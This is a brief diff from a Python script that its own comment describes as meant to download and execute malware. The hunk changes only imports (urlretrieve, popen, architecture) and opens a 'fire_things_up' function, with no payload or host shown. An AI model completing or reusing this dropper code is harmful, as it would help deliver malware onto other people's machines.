@@ -2,9 +2,9 @@
 #This script aims to download and execute your malware (¯\_(ツ)_/¯)
 #Start
 from os import popen
-import sys
+from sys import exit
 from platform import architecture
-from urllib import *
+from urllib import urlretrieve
 
 def fire_things_up(url,arch="No"):
     url   = ""
